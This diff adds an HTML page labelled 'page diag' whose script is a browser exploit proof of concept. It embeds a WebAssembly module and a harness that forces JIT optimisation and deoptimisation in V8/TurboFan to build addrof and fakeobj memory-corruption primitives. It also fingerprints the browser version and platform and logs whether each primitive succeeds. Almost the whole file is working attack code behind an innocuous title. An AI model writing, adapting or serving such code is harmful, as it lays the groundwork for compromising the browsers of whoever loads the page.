@@ -1,0 +1,70 @@
+<!doctype html><meta charset=utf-8><title>page diag</title>
+<body><pre id="r">loading</pre></body>
+<script>
+var HAMMER_N=0x200000, RETRIES_N=64;
+function out(m){ var r=document.getElementById('r'); r.textContent += '\n'+m; }
+var _CONFUSION_BYTES = new Uint8Array([0,97,115,109,1,0,0,0,1,12,3,96,0,0,96,0,1,111,96,0,1,126,2,16,1,3,101,110,118,8,99,97,108,108,98,97,99,107,0,0,3,3,2,1,2,6,11,2,111,1,208,111,11,126,1,66,0,11,7,43,4,5,103,95,114,101,102,3,0,5,103,95,105,54,52,3,1,10,114,101,116,117,114,110,95,114,101,102,0,1,10,114,101,116,117,114,110,95,105,54,52,0,2,10,15,2,6,0,16,0,35,0,11,6,0,16,0,35,1,11,0,32,4,110,97,109,101,1,25,2,1,10,114,101,116,117,114,110,95,114,101,102,2,10,114,101,116,117,114,110,95,105,54,52]);
+var armDeopt = false, deoptCounter = 0;
+function ProtoI64() {} function ProtoRef() {}
+var inst = new WebAssembly.Instance(new WebAssembly.Module(_CONFUSION_BYTES),
+  { env: { callback: function(){ if (armDeopt) ProtoRef.prototype['d' + (deoptCounter++)] = 1; } } });
+var exports_ = inst.exports;
+Object.defineProperty(ProtoI64.prototype, 'x', { get: exports_.return_i64 });
+Object.defineProperty(ProtoRef.prototype, 'x', { get: exports_.return_ref });
+var receivers = { i64: new ProtoI64(), ref: new ProtoRef() };
+function _mkpool() {
+  return [(o,p)=>{if(o)return p.x;return 0},(o,p)=>{if(o)return p.x;return 0},
+          (o,p)=>{if(o)return p.x;return 0},(o,p)=>{if(o)return p.x;return 0},
+          (o,p)=>{if(o)return p.x;return 0},(o,p)=>{if(o)return p.x;return 0},
+          (o,p)=>{if(o)return p.x;return 0},(o,p)=>{if(o)return p.x;return 0}];
+}
+var _poolA = _mkpool(), _poolB = _mkpool();
+var _stA = {i:0, n:0}, _stB = {i:0, n:0};
+var _HAMMER = HAMMER_N, _RETRIES = RETRIES_N, _ROTATE = 8;
+function _trigger(f, config) {
+  exports_.g_ref.value = config.refValue;
+  exports_.g_i64.value = config.i64Value;
+  armDeopt = false;
+  for (let i = 0; i < 30; ++i) { f(true, receivers[config.warmupOrder[0]]); f(true, receivers[config.warmupOrder[1]]); }
+  for (let i = 0; i < _HAMMER; ++i) f(false, receivers[config.optimizeSide]);
+  for (let i = 0; i < _HAMMER; ++i) f(false, receivers[config.optimizeSide]);
+  armDeopt = true;
+  return f(true, receivers[config.deoptSide]);
+}
+function _run(pool, st, config, good) {
+  for (let t = 0; t < _RETRIES; ++t) {
+    let r = _trigger(pool[st.i], config);
+    if (good(r)) { if (++st.n >= _ROTATE) { st.i = (st.i + 1) % pool.length; st.n = 0; } return r; }
+    st.i = (st.i + 1) % pool.length; st.n = 0;
+  }
+  throw "trigger failed (could not reach TurboFan)";
+}
+function addrof(object) {
+  return _run(_poolA, _stA, { refValue: object, i64Value: 0n,
+      warmupOrder: ['i64','ref'], optimizeSide: 'i64', deoptSide: 'ref' }, r => typeof r === 'bigint');
+}
+function fakeobj(addr) {
+  return _run(_poolB, _stB, { refValue: {dummy:true}, i64Value: BigInt.asUintN(64, BigInt(addr)),
+      warmupOrder: ['ref','i64'], optimizeSide: 'ref', deoptSide: 'i64' }, r => typeof r === 'object' && r !== null);
+}
+async function main(){
+  out('START');
+  try {
+    if (navigator.userAgentData) {
+      var h = await navigator.userAgentData.getHighEntropyValues(['fullVersionList','fullVersion','platform','architecture','bitness']);
+      out('UA ' + navigator.userAgent);
+      out('FULL ' + h.fullVersionList.map(b=>b.brand+'='+b.version).join(';'));
+      out('PLAT ' + h.platform + ' ' + h.architecture + ' ' + h.bitness);
+    } else out('UA ' + navigator.userAgent + ' | no UA-CH');
+  } catch(e){ out('UACH-ERR ' + e); }
+  out('JSPI promising=' + (typeof WebAssembly.promising) + ' Suspending=' + (typeof WebAssembly.Suspending));
+  var t0 = Date.now();
+  try {
+    var a = addrof({marker:1234});
+    out('ADDROF_OK 0x' + a.toString(16) + ' ms=' + (Date.now()-t0));
+    try { var f = fakeobj(a); out('FAKEOBJ_OK ' + (typeof f)); } catch(e){ out('FAKEOBJ_FAIL ' + e); }
+  } catch(e){ out('ADDROF_FAIL ' + (e && e.message ? e.message : e) + ' ms=' + (Date.now()-t0)); }
+  out('PROBE_COMPLETE');
+}
+main();
+</script>
